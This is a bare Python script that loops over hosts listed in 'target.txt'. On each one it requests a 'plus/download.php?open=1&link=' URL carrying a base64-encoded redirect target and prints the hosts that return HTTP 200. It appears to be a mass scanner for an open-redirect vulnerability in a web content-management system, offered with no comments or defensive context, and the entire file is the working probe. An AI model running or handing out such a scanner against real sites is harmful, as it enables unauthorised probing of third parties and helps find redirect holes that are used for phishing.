import os,requests
for url in open('target.txt'):
    url='http://'+url.strip()+'plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20'
    try :
        code=requests.get(url).status_code
        if code==200:
            print(url)
    except Exception as e:
        pass